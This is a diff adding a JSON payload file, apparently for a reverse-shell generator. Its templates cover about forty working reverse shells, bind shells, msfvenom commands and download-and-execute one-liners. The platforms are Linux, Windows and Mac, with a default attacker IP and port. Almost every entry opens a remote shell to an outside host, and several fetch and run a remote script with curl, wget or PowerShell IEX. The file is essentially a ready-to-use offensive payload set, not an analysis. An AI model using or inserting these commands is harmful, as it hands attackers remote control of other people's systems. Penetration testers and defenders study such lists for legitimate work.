@@ -1,0 +1,538 @@
+{
+  "listenerTypes": [
+    "Reverse",
+    "Bind",
+    "MSFVenom",
+    "HoaxShell"
+  ],
+  "defaults": {
+    "ip": "10.10.10.101",
+    "port": 9002,
+    "payloadType": "Reverse",
+    "os": "All",
+    "shell": "bash",
+    "encoding": "none"
+  },
+  "shells": [
+    "bash",
+    "sh",
+    "nc",
+    "ncat",
+    "python",
+    "python3",
+    "perl",
+    "php",
+    "ruby",
+    "lua",
+    "node",
+    "socat",
+    "awk",
+    "telnet",
+    "wget",
+    "curl",
+    "zsh",
+    "fish",
+    "powershell",
+    "cmd",
+    "pwsh"
+  ],
+  "operatingSystems": [
+    "Linux",
+    "Windows",
+    "Mac"
+  ],
+  "payloads": [
+    {
+      "name": "Bash -i",
+      "description": "bash -i >& /dev/tcp/IP/PORT 0>&1",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "bash",
+      "params": [
+        "_0x61d6c",
+        "_0x3889cd"
+      ],
+      "template": "bash -i >& /dev/tcp/{0}/{1} 0>&1"
+    },
+    {
+      "name": "Bash 5",
+      "description": "bash 5.x reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "bash",
+      "params": [
+        "_0xbc5565",
+        "_0x570642"
+      ],
+      "template": "0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196"
+    },
+    {
+      "name": "Bash 196",
+      "description": "bash 196 reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "bash",
+      "params": [
+        "_0x41204d",
+        "_0x454e9e"
+      ],
+      "template": "bash -i 5<>/dev/tcp/{0}/{1} 0<&5 1>&5 2>&5"
+    },
+    {
+      "name": "Bash read line",
+      "description": "bash read line reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "bash",
+      "params": [
+        "_0x1ea44a",
+        "_0x3bd497"
+      ],
+      "template": "bash -c 'exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done'"
+    },
+    {
+      "name": "Bash udp",
+      "description": "bash UDP reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "bash",
+      "params": [
+        "_0x49c6c1",
+        "_0x3524e6"
+      ],
+      "template": "bash -i >& /dev/udp/{0}/{1} 0>&1"
+    },
+    {
+      "name": "sh -i",
+      "description": "sh -i reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "sh",
+      "params": [
+        "_0x199cd3",
+        "_0x2cc2fa"
+      ],
+      "template": "sh -i >& /dev/tcp/{0}/{1} 0>&1"
+    },
+    {
+      "name": "nc mkfifo",
+      "description": "nc with mkfifo",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "nc",
+      "params": [
+        "_0x577207",
+        "_0x2aba4b"
+      ],
+      "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f"
+    },
+    {
+      "name": "nc -e",
+      "description": "nc -e reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "nc",
+      "params": [
+        "_0x4b5278",
+        "_0x9d43c1"
+      ],
+      "template": "nc -e /bin/sh {0} {1}"
+    },
+    {
+      "name": "nc.exe -e",
+      "description": "nc.exe -e reverse shell",
+      "os": "Windows",
+      "type": "Reverse",
+      "shell": "nc",
+      "params": [
+        "_0x2c7d92",
+        "_0x4772f7"
+      ],
+      "template": "nc.exe -e cmd.exe {0} {1}"
+    },
+    {
+      "name": "BusyBox nc -e",
+      "description": "BusyBox nc -e",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "nc",
+      "params": [
+        "_0x5bc007",
+        "_0x1591c8"
+      ],
+      "template": "busybox nc {0} {1} -e sh"
+    },
+    {
+      "name": "nc -c",
+      "description": "nc -c reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "nc",
+      "params": [
+        "_0x444d98",
+        "_0x4299d9"
+      ],
+      "template": "nc -c sh {0} {1}"
+    },
+    {
+      "name": "ncat -e",
+      "description": "ncat -e reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "ncat",
+      "params": [
+        "_0x517623",
+        "_0x4afb20"
+      ],
+      "template": "ncat {0} {1} -e /bin/bash"
+    },
+    {
+      "name": "Python",
+      "description": "Python reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "python",
+      "params": [
+        "_0x16a3dc",
+        "_0x12b4ef"
+      ],
+      "template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    },
+    {
+      "name": "Python3",
+      "description": "Python3 reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "python3",
+      "params": [
+        "_0x10d71d",
+        "_0x490daf"
+      ],
+      "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    },
+    {
+      "name": "Perl",
+      "description": "Perl reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "perl",
+      "params": [
+        "_0xcf8f9d",
+        "_0x586cb7"
+      ],
+      "template": "perl -e 'use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    },
+    {
+      "name": "PHP",
+      "description": "PHP reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "php",
+      "params": [
+        "_0x13b10a",
+        "_0x1e3193"
+      ],
+      "template": "php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    },
+    {
+      "name": "Ruby",
+      "description": "Ruby reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "ruby",
+      "params": [
+        "_0x214ecc",
+        "_0x13e755"
+      ],
+      "template": "ruby -rsocket -e'f=TCPSocket.open(\"{0}\",{1}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    },
+    {
+      "name": "Lua",
+      "description": "Lua reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "lua",
+      "params": [
+        "_0x4bef0a",
+        "_0x114ec5"
+      ],
+      "template": "lua -e \"local s=require('socket');local h=assert(socket.tcp());h:connect('{0}',{1});while true do local r,x=h:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));h:send(b);end\""
+    },
+    {
+      "name": "Node.js",
+      "description": "Node.js reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "node",
+      "params": [
+        "_0x27f438",
+        "_0x5bf886"
+      ],
+      "template": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/{0}/{1} 0>&1')\""
+    },
+    {
+      "name": "Socat",
+      "description": "Socat reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "socat",
+      "params": [
+        "_0x366de2",
+        "_0x245858"
+      ],
+      "template": "socat TCP:{0}:{1} EXEC:/bin/bash"
+    },
+    {
+      "name": "Awk",
+      "description": "Awk reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "awk",
+      "params": [
+        "_0x1c2070",
+        "_0xfcd8a9"
+      ],
+      "template": "awk 'BEGIN {s = \"/inet/tcp/0/{0}/{1}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}'"
+    },
+    {
+      "name": "Telnet",
+      "description": "Telnet reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "telnet",
+      "params": [
+        "_0x57ee86",
+        "_0x1d1478"
+      ],
+      "template": "TF=$(mktemp -u); mkfifo $TF && telnet {0} {1} 0<$TF | sh 1>$TF"
+    },
+    {
+      "name": "Wget",
+      "description": "Wget reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "wget",
+      "params": [
+        "_0x2ddc6a",
+        "_0x398a3d"
+      ],
+      "template": "wget -qO- http://{0}:{1}/shell.sh | sh"
+    },
+    {
+      "name": "Curl",
+      "description": "Curl reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "curl",
+      "params": [
+        "_0xdc5f2",
+        "_0x336ac9"
+      ],
+      "template": "curl http://{0}:{1}/shell.sh | sh"
+    },
+    {
+      "name": "Zsh",
+      "description": "Zsh reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "zsh",
+      "params": [
+        "_0xa0b8b0",
+        "_0x5590d5"
+      ],
+      "template": "zsh -i >& /dev/tcp/{0}/{1} 0>&1"
+    },
+    {
+      "name": "Fish",
+      "description": "Fish reverse shell",
+      "os": "Linux",
+      "type": "Reverse",
+      "shell": "fish",
+      "params": [
+        "_0x24549f",
+        "_0xc7c023"
+      ],
+      "template": "fish -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1'"
+    },
+    {
+      "name": "PowerShell",
+      "description": "PowerShell reverse shell",
+      "os": "Windows",
+      "type": "Reverse",
+      "shell": "powershell",
+      "params": [
+        "_0x4c4856",
+        "_0x2d6f9f"
+      ],
+      "template": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+    },
+    {
+      "name": "PowerShell IEX",
+      "description": "PowerShell IEX download",
+      "os": "Windows",
+      "type": "Reverse",
+      "shell": "powershell",
+      "params": [
+        "_0x32f814",
+        "_0x491b19"
+      ],
+      "template": "powershell -nop -W Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{0}:8000/payload.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost {0} -Lport {1} -Force\""
+    },
+    {
+      "name": "CMD",
+      "description": "CMD reverse shell",
+      "os": "Windows",
+      "type": "Reverse",
+      "shell": "cmd",
+      "params": [
+        "_0x1a3e4d",
+        "_0x21f659"
+      ],
+      "template": "cmd.exe /c \"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\""
+    },
+    {
+      "name": "Pwsh",
+      "description": "PowerShell Core (pwsh)",
+      "os": "Windows",
+      "type": "Reverse",
+      "shell": "pwsh",
+      "params": [
+        "_0x55d76f",
+        "_0x243a31"
+      ],
+      "template": "pwsh -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+    },
+    {
+      "name": "Bash Mac",
+      "description": "Bash for Mac",
+      "os": "Mac",
+      "type": "Reverse",
+      "shell": "bash",
+      "params": [
+        "_0x1b2722",
+        "_0x41a33e"
+      ],
+      "template": "bash -i >& /dev/tcp/{0}/{1} 0>&1"
+    },
+    {
+      "name": "Zsh Mac",
+      "description": "Zsh for Mac",
+      "os": "Mac",
+      "type": "Reverse",
+      "shell": "zsh",
+      "params": [
+        "_0xd8f85",
+        "_0x42c908"
+      ],
+      "template": "zsh -i >& /dev/tcp/{0}/{1} 0>&1"
+    },
+    {
+      "name": "Python Mac",
+      "description": "Python for Mac",
+      "os": "Mac",
+      "type": "Reverse",
+      "shell": "python",
+      "params": [
+        "_0x1d804e",
+        "_0x5eb174"
+      ],
+      "template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    },
+    {
+      "name": "nc Bind",
+      "description": "nc bind shell",
+      "os": "Linux",
+      "type": "Bind",
+      "shell": "nc",
+      "params": [
+        "_0x266f22",
+        "_0x4b51a5"
+      ],
+      "template": "nc -lvp {1} -e /bin/sh"
+    },
+    {
+      "name": "ncat Bind",
+      "description": "ncat bind shell",
+      "os": "Linux",
+      "type": "Bind",
+      "shell": "ncat",
+      "params": [
+        "_0x291a2d",
+        "_0x32c642"
+      ],
+      "template": "ncat -lvp {1} -e /bin/bash"
+    },
+    {
+      "name": "PowerShell Bind",
+      "description": "PowerShell bind shell",
+      "os": "Windows",
+      "type": "Bind",
+      "shell": "powershell",
+      "params": [
+        "_0x1b2cc6",
+        "_0x19b3f7"
+      ],
+      "template": "powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, {1}); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+    },
+    {
+      "name": "MSF Linux x86",
+      "description": "msfvenom linux x86",
+      "os": "Linux",
+      "type": "MSFVenom",
+      "shell": "bash",
+      "params": [
+        "_0x541e71",
+        "_0x84c0dd"
+      ],
+      "template": "msfvenom -p linux/x86/shell/reverse_tcp LHOST={0} LPORT={1} -f elf -o shell.elf"
+    },
+    {
+      "name": "MSF Windows x64",
+      "description": "msfvenom windows x64",
+      "os": "Windows",
+      "type": "MSFVenom",
+      "shell": "cmd",
+      "params": [
+        "_0x2a9cd4",
+        "_0xa21f13"
+      ],
+      "template": "msfvenom -p windows/x64/shell/reverse_tcp LHOST={0} LPORT={1} -f exe -o shell.exe"
+    },
+    {
+      "name": "MSF Windows PowerShell",
+      "description": "msfvenom windows powershell",
+      "os": "Windows",
+      "type": "MSFVenom",
+      "shell": "powershell",
+      "params": [
+        "_0x5327f3",
+        "_0x5b8fb5"
+      ],
+      "template": "msfvenom -p windows/shell/reverse_tcp LHOST={0} LPORT={1} -f psh -o shell.ps1"
+    },
+    {
+      "name": "HoaxShell Linux",
+      "description": "HoaxShell for Linux",
+      "os": "Linux",
+      "type": "HoaxShell",
+      "shell": "sh",
+      "params": [
+        "_0x451a5b",
+        "_0x6971aa"
+      ],
+      "template": "curl {0}:{1} | sh"
+    },
+    {
+      "name": "HoaxShell Windows",
+      "description": "HoaxShell for Windows",
+      "os": "Windows",
+      "type": "HoaxShell",
+      "shell": "powershell",
+      "params": [
+        "_0x14ffe3",
+        "_0x105614"
+      ],
+      "template": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{0}:{1}')\""
+    }
+  ]
+}
